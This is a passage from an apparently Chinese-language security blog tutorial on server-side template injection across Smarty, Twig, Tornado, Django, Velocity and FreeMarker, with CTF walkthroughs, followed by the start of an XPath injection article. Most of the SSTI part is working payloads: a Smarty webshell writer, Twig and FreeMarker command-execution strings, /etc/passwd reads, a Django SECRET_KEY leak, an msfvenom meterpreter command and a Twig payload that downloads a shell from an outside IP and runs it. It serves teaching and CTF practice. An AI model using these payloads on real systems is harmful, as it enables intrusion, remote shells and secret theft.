!file_exists($_dirpath)) { mkdir($_dirpath, $smarty-&gt;_dir_perms === null ? 0777 : $smarty-&gt;_dir_perms, true); } // write to tmp file, then move to overt file lock race condition $_tmp_file = $_dirpath . DS . str_replace(array('.', ','), '_', uniqid('wrt', true)); if (!file_put_contents($_tmp_file, $_contents)) { error_reporting($_error_reporting); throw new SmartyException(\"unable to write file {$_tmp_file}\"); } /* * Windows' rename() fails if the destination exists, * Linux' rename() properly handles the overwrite. * Simply unlink()ing a file might cause other processes * currently reading that file to fail, but linux' rename() * seems to be smart enough to handle that for us. */ if (Smarty::$_IS_WINDOWS) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } else { // rename tmp file $success = @rename($_tmp_file, $_filepath); if (!$success) { // remove original file if (is_file($_filepath)) { @unlink($_filepath); } // rename tmp file $success = @rename($_tmp_file, $_filepath); } } if (!$success) { error_reporting($_error_reporting); throw new SmartyException(\"unable to write file {$_filepath}\"); } if ($smarty-&gt;_file_perms !== null) { // set file permissions chmod($_filepath, $smarty-&gt;_file_perms); umask($old_umask); } error_reporting($_error_reporting); return true; } } 可以看到 writeFile 函数第三个参数一个 Smarty 类型，后来找到了 self::clearConfig()，函数原型： public function clearConfig($varname = null) { return Smarty_Internal_Extension_Config::clearConfig($this, $varname); } 因此我们可以构造payload写个webshell: {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,\"&lt;?php eval($_GET['cmd']); ?&gt;\",self::clearConfig())} CTF地址：https://buuoj.cn/challenges（CISCN2019华东南赛区Web11） 题目模拟了一个获取IP的API，并且可以在最下方看到 “Build With Smarty !” 可以确定页面使用的是Smarty模板引擎。 在页面的右上角发现了IP，但是题目中显示的API的URL由于环境的原因无法使用，猜测这个IP受X-Forwarded-For头控制。 将XFF头改为 {6*7} 会发现该位置的值变为了42，便可以确定这里存在SSTI。 直接构造 {system(‘cat /flag’)} 即可得到flag 1. Smarty-SSTI常规利用方式 **1. {$smarty.version}** {$smarty.version} #获取smarty的版本号 2. {php}{/php} {php}phpinfo();{/php} #执行相应的php代码 Smarty支持使用 {php}{/php} 标签来执行被包裹其中的php指令，最常规的思路自然是先测试该标签。但就该题目而言，使用{php}{/php}标签会报错： 因为在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。 **3. {literal}** &lt;script language=\"php\"&gt;phpinfo();&lt;/script&gt; 这个地方借助了 {literal} 这个标签，因为 {literal} 可以让一个模板区域的字符原样输出。 这经常用于保护页面上的Javascript或css样式表，避免因为Smarty的定界符而错被解析。但是这种写法只适用于php5环境，这道ctf使用的是php7，所以依然失败 4. getstreamvariable {self::getStreamVariable(\"file:///etc/passwd\")} Smarty类的getStreamVariable方法的代码如下： public function getStreamVariable($variable) { $_result = ''; $fp = fopen($variable, 'r+'); if ($fp) { while (!feof($fp) &amp;&amp; ($current_line = fgets($fp)) !== false) { $_result .= $current_line; } fclose($fp); return $_result; } $smarty = isset($this-&gt;smarty) ? $this-&gt;smarty : $this; if ($smarty-&gt;error_unassigned) { throw new SmartyException('Undefined stream variable \"' . $variable . '\"'); } else { return null; } } 可以看到这个方法可以读取一个文件并返回其内容，所以我们可以用self来获取Smarty对象并调用这个方法。然而使用这个payload会触发报错如下： 可见这个旧版本Smarty的SSTI利用方式并不适用于新版本的Smarty。而且在3.1.30的Smarty版本中官方已经把该静态方法删除。 对于那些文章提到的利用 Smarty_Internal_Write_File 类的writeFile方法来写shell也由于同样的原因无法使用。 **5. {if}{/if}** {if phpinfo()}{/if} Smarty的 {if} 条件判断和PHP的if非常相似，只是增加了一些特性。每个{if}必须有一个配对的{/if}，也可以使用{else} 和 {elseif}，全部的PHP条件表达式和函数都可以在if内使用，如||*，or，&amp;&amp;，and，is_array()等等，如：{if is_array($array)}{/if}* 既然这样就将XFF头改为 {if phpinfo()}{/if} ： 同样还能用来执行一些系统命令： 2. CTF漏洞成因 本题中引发SSTI的代码简化后如下： &lt;?php require_once('./smarty/libs/' . 'Smarty.class.php'); $smarty = new Smarty(); $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; $smarty-&gt;display(\"string:\".$ip); // display函数把标签替换成对象的php变量；显示模板 } 可以看到这里使用字符串代替smarty模板，导致了注入的Smarty标签被直接解析执行，产生了SSTI。 3. PHP的模板注入 如果是在cookie处执行，最好抓包打payload，可能有url编码的问题 六、PHP-Blade模板 Blade 是 Laravel 提供的一个既简单又强大的模板引擎。 关于blade模板这里不再多说，请参考《laravel Blade 模板引擎》 遇到在学吧… 七、PHP-Twig引擎 Twig是来自于Symfony的模板引擎，它非常易于安装和使用。它的操作有点像Mustache和liquid。 eg： &lt;?php require_once dirname(__FILE__).'\\twig\\lib\\Twig\\Autoloader.php'; Twig_Autoloader::register(true); $twig = new Twig_Environment(new Twig_Loader_String()); $output = $twig-&gt;render(\"Hello {{name}}\", array(\"name\" =&gt; $_GET[\"name\"])); // 将用户输入作为模版变量的值 echo $output; ?&gt; Twig使用一个加载器 loader(Twig_Loader_Array) 来定位模板，以及一个环境变量 environment(Twig_Environment) 来存储配置信息。 其中，render() 方法通过其第一个参数载入模板，并通过第二个参数中的变量来渲染模板。 使用 Twig 模版引擎渲染页面，其中模版含有 {{name}} 变量，其模版变量值来自于GET请求参数$_GET[\"name\"] 。 显然这段代码并没有什么问题，即使你想通过name参数传递一段JavaScript代码给服务端进行渲染，也许你会认为这里可以进行 XSS，但是由于模版引擎一般都默认对渲染的变量值进行编码和转义，所以并不会造成跨站脚本攻击: 但是,如果渲染的模版内容受到用户的控制,情况就不一样了。修改代码为: &lt;?php require_once dirname(__FILE__).'/../lib/Twig/Autoloader.php'; Twig_Autoloader::register(true); $twig=newTwig_Environment(newTwig_Loader_String()); $output=$twig-&gt;render(\"Hello {$_GET['name']}\");// 将用户输入作为模版内容的一部分 echo $output; ?&gt; 上面这段代码在构建模版时，拼接了用户输入作为模板的内容，现在如果再向服务端直接传递 JavaScript 代码，用户输入会原样输出，测试结果显而易见: 如果服务端将用户的输入作为了模板的一部分，那么在页面渲染时也必定会将用户输入的内容进行模版编译和解析最后输出。 在Twig模板引擎里,，{{var}} 除了可以输出传递的变量以外，还能执行一些基本的表达式然后将其结果作为该模板变量的值。 例如这里用户输入name={{2*10}} ，则在服务端拼接的模版内容为: 尝试插入一些正常字符和 Twig 模板引擎默认的注释符，构造 Payload 为: bmjoker{# comment #}{{2*8}}OK 实际服务端要进行编译的模板就被构造为: bmjoker{# comment #}{{2*8}}OK 由于 {# comment #} 作为 Twig 模板引擎的默认注释形式，所以在前端输出的时候并不会显示，而 {{2*8}} 作为模板变量最终会返回16 作为其值进行显示，因此前端最终会返回内容 Hello bmjoker16OK 通过上面两个简单的示例,就能得到 SSTI 扫描检测的大致流程(这里以 Twig 为例): 同常规的 SQL 注入检测，XSS 检测一样，模板注入漏洞的检测也是向传递的参数中承载特定 Payload 并根据返回的内容来进行判断的。 每一个模板引擎都有着自己的语法，Payload 的构造需要针对各类模板引擎制定其不同的扫描规则，就如同 SQL 注入中有着不同的数据库类型一样。 简单来说，就是更改请求参数使之承载含有模板引擎语法的 Payload，通过页面渲染返回的内容检测承载的 Payload 是否有得到编译解析，有解析则可以判定含有 Payload 对应模板引擎注入，否则不存在 SSTI。 凡是使用模板的网站，基本都会存在SSTI，只是能否控制其传参而已。 接下来借助XVWA的代码来实践演示一下SSTI注入 如果在web页面的源代码中看到了诸如以下的字符，就可以推断网站使用了某些模板引擎来呈现数据 &lt;div&gt;{$what}&lt;/div&gt; &lt;p&gt;Welcome, {{username}}&lt;/p&gt; &lt;div&gt;{%$a%}&lt;/div&gt; ... 通过注入了探测字符串 $579，以查看应用程序是否进行了相应的计算： 根据这个响应，我们可以推测这里使用了模板引擎，因为这符合它们对于 {{ }} 的处理方式 在这里提供一个针对twig的攻击载荷： {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} 使用msf生成了一个php meterpreter有效载荷 msfvenom -p php/meterpreter/reverse_tcp -f raw LHOST=192.168.127.131 LPORT=4321 &gt; /var/www/html/shell.txt msf进行监听： 模板注入远程下载shell，并重命名运行 {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"wget http://192.168.127.131/shell.txt -O /tmp/shell.php;php -f /tmp/shell.php\")}} 以上就是php twig模板注入，由于以上使用的twig为2.x版本，现在官方已经更新到3.x版本，根据官方文档新增了 filter 和 map 等内容，补充一些新版本的payload： {{'/etc/passwd'|file_excerpt(1,30)}} {{app.request.files.get(1).__construct('/etc/passwd','')}} {{app.request.files.get(1).openFile.fread(99)}} {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"whoami\")}} {{_self.env.enableDebug()}}{{_self.env.isDebug()}} {{[\"id\"]|map(\"system\")|join(\",\") {{{\"&lt;?php phpinfo();\":\"/var/www/html/shell.php\"}|map(\"file_put_contents\")}} {{[\"id\",0]|sort(\"system\")|join(\",\")}} {{[\"id\"]|filter(\"system\")|join(\",\")}} {{[0,0]|reduce(\"system\",\"id\")|join(\",\")}} {{['cat /etc/passwd']|filter('system')}} 具体payload分析详见：《TWIG 全版本通用 SSTI payloads》 利用payload为： msf反弹shell {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"id\")}} //id是执行linux命令的地方，这个payload好像只能回显最前面的一个 补充：TWIG 全版本通用 SSTI payloads 八、Python-tornado模板 tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过{{}}进行传递变量和执行简单的表达式。 以下代码将定义一个TEMPLATE变量作为一个模板文件，然后使用传入的name替换模板中的\"FOO\"，在进行加载模板并输出，且未对name值进行安全检查输入情况。 import tornado.template import tornado.ioloop import tornado.web TEMPLATE = ''' &lt;html&gt; &lt;head&gt;&lt;title&gt; Hello {{ name }} &lt;/title&gt;&lt;/head&gt; &lt;body&gt; Hello max &lt;/body&gt; &lt;/html&gt; ''' class MainHandler(tornado.web.RequestHandler): def get(self): name = self.get_argument('name', '') template_data = TEMPLATE.replace(\"FOO\",name) t = tornado.template.Template(template_data) self.write(t.generate(name=name)) application = tornado.web.Application([(r\"/\", MainHandler),], debug=True, static_path=None, template_path=None) if __name__ == '__main__': application.listen(8000) tornado.ioloop.IOLoop.instance().start() 这里拿一道BUUCTF的题来演示一下tornado render模板注入： [护网杯 2018]easy_tornado 根据上面的信息，我们知道flag在/fllllllllllllag文件中 render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页render配合Tornado使用 最后就是这段代码md5(cookie_secret+md5(filename))，再来分析我们访问的链接： http://313ac7f3-c560-4d46-b1ff-daa279729980.node4.buuoj.cn:81/file?filename=/flag.txt&amp;filehash=27eda9bc17cbe1b856e6d541e10c16ea 推测md5加密过后的值就是url中filehash对应的值，想获得flag只要我们在filename中传入/fllllllllllllag文件和filehash，所以关键是获取cookie_secret 在tornado模板中，存在一些可以访问的快速对象，比如 {{escape(handler.settings[\"cookie\"])}}，这个其实就是handler.settings对象，里面存储着一些环境变量。 具体分析请参照《python SSTI tornado render模板注入》。 观察错误页面，发现页面返回的由msg的值决定 修改msg的值注入，获得环境变量 cookie_secret: faaff564-f1dd-429d-90b3-130ab49962ea 得到cookie_secret的值，根据上面的md5进行算法重构，就可以得到filehash，这里给出py3的转换脚本 import hashlib hash = hashlib.md5() filename='/fllllllllllllag' cookie_secret=\"faaff564-f1dd-429d-90b3-130ab49962ea\" hash.update(filename.encode('utf-8')) s1=hash.hexdigest() hash = hashlib.md5() hash.update((cookie_secret+s1).encode('utf-8')) print(hash.hexdigest()) 得到filehash=874955327dac355296226eb28f1b02b8，得到flag 九、Python-Django模板 先看存在漏洞的代码： def view(request, *args, **kwargs): template = 'Hello {user}, This is your email: ' + request.GET.get('email') return HttpResponse(template.format(user=request.user)) 很明显 email 就是注入点，但是条件被限制的很死，很难执行命令，现在拿到的只有有一个和user有关的变量request.user ，这个时候我们就应该在没有应用源码的情况下去寻找框架本身的属性，看这个空框架有什么属性和类之间的引用。 后来发现Django自带的应用 “admin”（也就是Django自带的后台）的models.py中导入了当前网站的配置文件： 所以可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。 payload如下： http://localhost:8000/?email={user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY} http://localhost:8000/?email={user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY} 十、Java-velocity模板 （以下板块参照自《CVE-2019-3396 Confluence Velocity SSTI漏洞浅析》） Apache Velocity是一个基于Java的模板引擎，它提供了一个模板语言去引用由Java代码定义的对象。Velocity是Apache基金会旗下的一个开源软件项目，旨在确保Web应用程序在表示层和业务逻辑层之间的隔离（即MVC设计模式）。 1. 基本语法 语句标识符 #用来标识Velocity的脚本语句，包括#set、#if 、#else、#end、#foreach、#end、#include、#parse、#macro等语句。 变量 $用来标识一个变量，比如模板文件中为Hello $a，可以获取通过上下文传递的$a 声明 set用于声明Velocity脚本变量，变量可以在脚本中声明 #set($a =\"velocity\") #set($b=1) #set($arrayName=[\"1\",\"2\"]) 注释 单行注释为##，多行注释为成对出现的#* … *# 条件语句 以if/else为例： #if($foo&lt;10) &lt;strong&gt;1&lt;/strong&gt; #elseif($foo==10) &lt;strong&gt;2&lt;/strong&gt; #elseif($bar==6) &lt;strong&gt;3&lt;/strong&gt; #else &lt;strong&gt;4&lt;/strong&gt; #end 转义字符 如果$a已经被定义，但是又需要原样输出$a，可以试用\\转义作为关键的$ 基础使用 使用Velocity主要流程为： 初始化Velocity模板引擎，包括模板路径、加载类型等 创建用于存储预传递到模板文件的数据的上下文 选择具体的模板文件，传递数据完成渲染 VelocityTest.java package Velocity; import org.apache.velocity.Template; import org.apache.velocity.VelocityContext; import org.apache.velocity.app.VelocityEngine; import java.io.StringWriter; public class VelocityTest { public static void main(String[] args) { VelocityEngine velocityEngine = new VelocityEngine(); velocityEngine.setProperty(VelocityEngine.RESOURCE_LOADER, \"file\"); velocityEngine.setProperty(VelocityEngine.FILE_RESOURCE_LOADER_PATH, \"src/main/resources\"); velocityEngine.init(); VelocityContext context = new VelocityContext(); context.put(\"name\", \"Rai4over\"); context.put(\"project\", \"Velocity\"); Template template = velocityEngine.getTemplate(\"test.vm\"); StringWriter sw = new StringWriter(); template.merge(context, sw); System.out.println(\"final output:\" + sw); } } 模板文件：src/main/resources/test.vm Hello World! The first velocity demo. Name is $name. Project is $project 输出结果： final output: Hello World! The first velocity demo. Name is Victor Zhang. Project is Velocity java.lang.UNIXProcess@12f40c25 通过 VelocityEngine 创建模板引擎，接着 velocityEngine.setProperty 设置模板路径 src/main/resources、加载器类型为file，最后通过 velocityEngine.init() 完成引擎初始化。 通过 VelocityContext() 创建上下文变量，通过put添加模板中使用的变量到上下文。 通过 getTemplate 选择路径中具体的模板文件test.vm，创建 StringWriter 对象存储渲染结果，然后将上下文变量传入 template.merge 进行渲染。 比如： 这里使用java-sec-code里面的SSTI代码： poc： http://127.0.0.1:8080/ssti/velocity?template=%23set(%24e=%22e%22);%24e.getClass().forName(%22java.lang.Runtime%22).getMethod(%22getRuntime%22,null).invoke(null,null).exec(%22calc%22)$class.inspect(\"java.lang.Runtime\").type.getRuntime().exec(\"sleep 5\").waitFor() //延迟了5秒 参照《白头搔更短，SSTI惹人心！》简单进行调试 在最初的Controller层下断点，来追踪poc的解析过程： （template -&gt; instring）进入 Velocity.evaluate 方法： （instring -&gt; reader）继续跟进 evaluate 方法，RuntimeInstance类中封装了evaluate方法，instring被强制转化(Reader)类型。 跟进 StringReader 方法查看详情： （reader -&gt; nodeTree）继续跟进 this.evaluate() 方法 （nodeTree -&gt; writer）继续跟进render方法 emmm…继续跟进render 继续看render方法 跟进execute方法 可以看到这是最后一步了，调试结束就可以看到poc已经成功被执行，看一下上图中的for循环的代码，大概意思是当遍历的节点时候，这时候就会一步步的保存我们的payload最终导致RCE Confluence 未授权RCE分析（CVE-2019-3396） 根据官方文档的描述，可以看到这是由 widget Connector 这个插件造成的SSTI，利用SSTI而造成的RCE。在经过diff后，可以确定触发漏洞的关键点在于对post包中的_template字段 具体漏洞代码调试可以参考：《Confluence未授权模板注入/代码执行(CVE-2019-3396)》 《[Confluence 未授权RCE分析（CVE-2019-3396）](https://lucifaer.com/2019/04/16/Confluence 未授权RCE分析（CVE-2019-3396）/#0x01-漏洞概述)》 十一、Java-FreeMarker FreeMarker 是一款模板引擎：即一种基于模板和要改变的数据， 并用来生成输出文本(HTML网页，电子邮件，配置文件，源代码等)的通用工具。 它不是面向最终用户的，而是一个Java类库，是一款程序员可以嵌入他们所开发产品的组件。 FreeMarker模板代码： &lt;html&gt; &lt;head&gt; &lt;title&gt;Welcome!&lt;/title&gt; &lt;/head&gt; &lt;body&gt;　&lt;#–这是注释–&gt; &lt;h1&gt;Welcome ${user}!&lt;/h1&gt; &lt;p&gt;Our latest product: &lt;a href=\"${latestProduct.url}\"&gt;${latestProduct.name}&lt;/a&gt;! &lt;/body&gt; &lt;/html&gt; 模板文件存放在Web服务器上，就像通常存放静态HTML页面那样。当有人来访问这个页面， FreeMarker将会介入执行，然后动态转换模板，用最新的数据内容替换模板中 ${…} 的部分， 之后将结果发送到访问者的Web浏览器中。 这个模板主要用于 java ，用户可以通过实现 TemplateModel 来用 new 创建任意 Java 对象 具体的高级内置函数定义参考《Seldom used and expert built-ins》 主要的用法如下： &lt;＃ - 创建一个用户定义的指令，调用类的参数构造函数 - &gt; &lt;#assign word_wrapp =\"com.acmee.freemarker.WordWrapperDirective\"?new（）&gt; &lt;＃ - 创建一个用户定义的指令，用一个数字参数调用构造函数 - &gt; &lt;#assign word_wrapp_narrow =\"com.acmee.freemarker.WordWrapperDirective\"?new（40）&gt; 调用了构造函数创建了一个对象，那么这个 payload 中就是调用的 freemarker 的内置执行命令的对象 Execute freemarker.template.utility 里面有个Execute类，这个类会执行它的参数，因此我们可以利用new函数新建一个Execute类，传输我们要执行的命令作为参数，从而构造远程命令执行漏洞。构造payload： &lt;#assign value=\"freemarker.template.utility.Execute\"?new()&gt;${value(\"calc.exe\")} freemarker.template.utility 里面的JythonRuntime，可以通过自定义标签的方式，执行Python命令，从而构造远程命令执行漏洞。 &lt;#assign value=\"freemarker.template.utility.JythonRuntime\"?new()&gt;&lt;@value&gt;import os;os.system(\"calc.exe\")&lt;/@value&gt; 这里使用测试代码来大概演示一下：https://github.com/hellokoding/springboot-freemarker 代码演示说明：https://hellokoding.com/spring-boot/freemarker/ 前端代码 ——&gt; hello.ftl &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;title&gt;Hello ${name}!&lt;/title&gt; &lt;link href=\"/css/main.css\" rel=\"stylesheet\"&gt; &lt;/head&gt; &lt;body&gt; &lt;h2 class=\"hello-title\"&gt;Hello ${name}!&lt;/h2&gt; &lt;script src=\"/js/main.js\"&gt;&lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 后端代码 ——&gt; HelloController.java： package com.backendvulnerabilities.ssti; import freemarker.cache.MultiTemplateLoader; import freemarker.cache.StringTemplateLoader; import freemarker.cache.TemplateLoader; import freemarker.template.Configuration; import freemarker.template.Template; import freemarker.template.TemplateException; import freemarker.template.utility.DateUtil; import org.springframework.beans.factory.annotation.Autowired; import org.springframework.stereotype.Controller; import org.springframework.ui.Model; import org.springframework.web.bind.annotation.*; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.IOException; import java.io.StringWriter; import java.util.HashMap; import java.util.Map; @Controller public class HelloController { @Autowired private Configuration con; @GetMapping(\"/\") public String index() { return \"index\"; } @RequestMapping(value = \"/hello\") public String hello(@RequestBody Map&lt;String,Object&gt; body, Model model) { model.addAttribute(\"name\", body.get(\"name\")); return \"hello\"; } @RequestMapping(value = \"/freemarker\") public void freemarker(@RequestParam(\"username\") String username, HttpServletRequest httpserver,HttpServletResponse response) { try{ String data = \"1ooooooooooooooooooo~\"; String templateContent = \"&lt;html&gt;&lt;body&gt;Hello \" + username + \" ${data}&lt;/body&gt;&lt;/html&gt;\"; String html = createHtmlFromString(templateContent,data); response.getWriter().println(html); }catch (Exception e){ e.printStackTrace(); } } private String createHtmlFromString(String templateContent, String data) throws IOException, TemplateException { Configuration cfg = new Configuration(); StringTemplateLoader stringLoader = new StringTemplateLoader(); stringLoader.putTemplate(\"myTemplate\",templateContent); cfg.setTemplateLoader(stringLoader); Template template = cfg.getTemplate(\"myTemplate\",\"utf-8\"); Map root = new HashMap(); root.put(\"data\",data); StringWriter writer = new StringWriter(); template.process(root,writer); return writer.toString(); } @RequestMapping(value = \"/template\", method = RequestMethod.POST) public String template(@RequestBody Map&lt;String,String&gt; templates) throws IOException { StringTemplateLoader stringLoader = new StringTemplateLoader(); for(String templateKey : templates.keySet()){ stringLoader.putTemplate(templateKey, templates.get(templateKey)); } con.setTemplateLoader(new MultiTemplateLoader(new TemplateLoader[]{stringLoader, con.getTemplateLoader()})); return \"index\"; } } 上述代码主要编译给定的模板字符串和数据，生成HTML进行输出 模板注入的前提是在无过滤的情况下，使用模板来解析我们输入的字符，可以通过页面上的变化，来判断我们输入的内容是否被解析，如上图我们输入的内容被成功解析到页面上，并且没有过滤。 首先需要控制被攻击模板 /template 的内容，也就是要将本来无危害的模板文件实时更改为可攻击的模板内容。使用的payload {\"hello.ftl\": \"&lt;!DOCTYPE html&gt;&lt;html lang=\\\"en\\\"&gt;&lt;head&gt;&lt;meta charset=\\\"UTF-8\\\"&gt;&lt;#assign ex=\\\"freemarker.template.utility.Execute\\\"?new()&gt; ${ ex(\\\"ping ilxwh0.dnslog.cn\\\") }&lt;title&gt;Hello!&lt;/title&gt;&lt;link href=\\\"/css/main.css\\\" rel=\\\"stylesheet\\\"&gt;&lt;/head&gt;&lt;body&gt;&lt;h2 class=\\\"hello-title\\\"&gt;Hello!&lt;/h2&gt;&lt;script src=\\\"/js/main.js\\\"&gt;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\"} 关键代码在上图的红框中，接收用户传入的参数，使用keySet()获取key值，遍历相应的模块名字，使用StringTemplateLoader来加载模板内容，并使用putTemplate将key对应的value（也就是payload）写入templateKey中。这样就可以覆盖 hello.ftl 文件的内容，具体如下： 重新更改了加载的模板内容后，然后直接访问受影响的模板文件路径，此时恶意的模板文件内容就会被加载成功了，并执行了系统命令 dnslog平台也受到了请求 后言 由于本篇文章篇幅过长，容易脑壳疼，所以分为上下篇，上篇大概介绍了几种语言常见的几种模板注入，下篇分析几个cms的模板注入，包括海洋cms，74cms，ofcms等 参考：https://www.cnblogs.com/bmjoker/p/13508538.html 十二、自动化工具 1.手动安装，具体参考： https://github.com/Marven11/Fenjing git clone https://github.com/Marven11/Fenjing cd Fenjing python -m pip install -r requirements.txt python -m fenjing scan --url 'http://xxx/' 输入以上命令随后，cat /flag即可得到flag 参考：https://xz.aliyun.com/t/11108 --smarty模板 2.这里推荐自动化工具tplmap，拿shell、执行命令、bind_shell、反弹shell、上传下载文件，Tplmap为SSTI的利用提供了很大的便利 github地址：https://github.com/epinna/tplmap 一键shell真香，还支持其他模板（Smarty，Mako，Tornado，Jinja2）的注入检测 十三、漏洞防御 和其他的注入防御一样，绝对不要让用户对传入模板的内容或者模板本身进行控制 减少或者放弃直接使用格式化字符串结合字符串拼接的模板渲染方式，使用正规的模板渲染方法 尽可能加载静态模板文件 另一个选择是创建一个安全加固/沙箱环境，禁用或删除潜在的危险指令。","categories":["常见top漏洞"]},{"title":"浅析Xpath注入","path":"/2023/08/06/qian-xi-xpath-zhu-ru/","content":"Xpath注入总结 0x01 什么是Xpath XPath 即为 XML 路径语言，是 W3C XSLT 标准的主要元素，它是一种用来确定 XML（标准通用标记语言的子集）文档中某部分位置的语言。它是一种用来在内存中导航整个XML树的语言,它的设计初衷是作为一种面向XSLT和XPointer的语言,后来独立成了一种W3C标准。 XPath 基于 XML 的树状结构，有不同类型的节点，包括元素节点，属性节点和文本节点，提供在数据结构树中找寻节点的能力，可用来在 XML 文档中对元素和属性进行遍历。 XPath 使用路径表达式来选取 XML 文档中的节点或者节点集。这些路径表达式和我们在常规的电脑文件系统中看到的表达式非常相似。 **一句话总结：**XPath的作用就是用于在XML或HTML中查找信息，就像SQL语句的作用是在数据库中查询信息一样。 0x02 Xpath的简单演示 Xpath语法的简单展示: 在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或成为根节点）。 nodename：选取此节点的所有节点 /： 从根节点选取 //：表示选取所有的子元素，不考虑其在文档的位置 .： 选取当前节点 ..：选取当前节点的父节点 @：选取属性 或@*: 匹配任何属性节点 *: 匹配任何元素节点 函数： starts-with 匹配一个属性开始位置的关键字 contains 匹配一个属性值中包含的字符串 text（） 匹配的是显示文本信息 //代码示例: &lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt; &lt;students&gt; &lt;student number=\"1\"&gt; &lt;name id=\"zs\"&gt; &lt;xing&gt;张&lt;/xing&gt; &lt;ming&gt;三&lt;/ming&gt; &lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;/student&gt; &lt;student number=\"2\"&gt; &lt;name id = \"ls\"&gt;李四&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;sex&gt;female&lt;/sex&gt; &lt;/student&gt; &lt;/students&gt; //这里根节点是&lt;students&gt; //像&lt;xing&gt;或者&lt;name&gt;这些都可以叫元素节点 //id=\"zs\"这些事属性节点 上边是一个简单的XML文档，那么接下来用Xpath来查语句（这里用python语言举例，但这里不知为何，我的python运行不了，可能版本不匹配了） from lxml import etree xml =''' &lt;students&gt; &lt;student number=\"1\"&gt; &lt;name id=\"zs\"&gt; &lt;xing&gt;张&lt;/xing&gt; &lt;ming&gt;三&lt;/ming&gt; &lt;/name&gt; &lt;age&gt;18&lt;/age&gt; &lt;sex&gt;male&lt;/sex&gt; &lt;/student&gt; &lt;student number=\"2\"&gt; &lt;name id = \"ls\"&gt;李四&lt;/name&gt; &lt;age&gt;24&lt;/age&gt; &lt;sex&gt;female&lt;/sex&gt; &lt;/student&gt; &lt;/students&gt; ''' tree = etree.XML(xml) #选所有students，选第一个值-&gt;students-&gt;student-&gt;name-&gt;xing的文本 out = tree.xpath('//students')[0][0][0][0].text print(out) print('-------------------------------------') #所有name元素，第二个也就是李四那个,选它的文本 out = tree.xpath('//name')[1].text print(out) out = tree.xpath('//name')[1].xpath('@id') print(out) 以下 是大佬的成功展示案例(通过这里我们可以体会到类似于sql查询的感觉) 0x03 Xpath基础语法 (1)查询基本语句 //users/user[loginID/text()=’abc’ and password/text()=’test123’] 。 这是一个XPath查询语句，获取loginID为abc的所有user数据，用户需要提交正确的loginID和password才能返回结果。如果黑客在 loginID 字段中输入：’ or 1=1 并在 password 中输入：’ or 1=1 就能绕过校验，成功获取所有user数据。 //users/user[LoginID/text()=''or 1=1 and password/text()=''or 1=1] (2)节点类型 在XPath中,XML文档被作为节点树对待,XPath中有七种结点类型：元素、属性、文本、命名空间、处理指令、注释以及文档节点（或称为根节点）。 文档的根节点即是文档结点；对应属性有属性结点，元素有元素结点。 element (元素) attribute (属性) text (文本) namespace (命名空间) processing-instruction (处理指令) comment (注释) root (根节点) 例如下面的XML文档 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;bookstore&gt; &lt;book&gt; &lt;title lang=\"en\"&gt;Harry Potter&lt;/title&gt; &lt;author&gt;J K. Rowling&lt;/author&gt; &lt;year&gt;2005&lt;/year&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt; &lt;/bookstore &lt;bookstore&gt; 根节点 &lt;author&gt;J K. Rowling&lt;/author&gt; 元素节点 lang=\"en\" 属性节点 下面是一个匹配节点的实例 &lt;?xml version=\"1.0\" encoding=\"ISO-8859-1\"?&gt; &lt;bookstore&gt; &lt;book&gt; &lt;title lang=\"eng\"&gt;Harry Potter&lt;/title&gt; &lt;price&gt;29.99&lt;/price&gt; &lt;/book&gt; &lt;book&gt; &lt;title lang=\"eng\"&gt;Learning XML&lt;/title&gt; &lt;price&gt;39.95&lt;/price&gt; &lt;/book&gt; &lt;/bookstore&gt; 路径表达式结果 (4)限定语 限定语是对路径表达式的附加条件,用来查找某个特定的节点或者包含某个指定的值的节点.限定语被嵌在方括号中，路径表达式结果： (5)通配符 XPath 通配符可用来选取未知的 XML 元素. 实例： 更多细节参考:Xpa`th注入 0x04XPath注入的定义 ​ XPath注入攻击，是指利用XPath 解析器的松散输入和容错特性，能够在 URL、表单或其它信息上附带恶意的XPath 查询代码，以获得权限信息的访问权并更改这些信息。XPath注入攻击是针对Web服务应用新的攻击方法，它允许攻击者在事先不知道XPath查询相关知识的情况下，通过XPath查询得到一个XML文档的完整内容。Xpath注入攻击本质上和SQL注入攻击是类似的，都是输入一些恶意的查询等代码字符串，从而对网站进行攻击。 ​ XPath注入发生在当站点使用用户输入的信息来构造请求以获取XML数据。攻击者对站点发送经过特殊构造的信息来探究站点使用的XML是如何构造的，从而进一步获取正常途径下无法获取的数据。当XML数据被用作账户验证时，攻击者还可以提升他的权限。 0x05 xpath注入原理 ​ xpath注入的原理其实和sql注入很像， XPath注入攻击主要是通过构建特殊的输入，这些输入往往是XPath语法中的一些组合，这些输入将作为参数传入Web 应用程序，通过执行XPath查询而执行入侵者想要的操作，**但是，注入的对象不是数据库users表了，而是一个存储数据的XML文件。**攻击者可以获取 XML 数据的组织结构，或者访问在正常情况下不允许访问的数据，如果 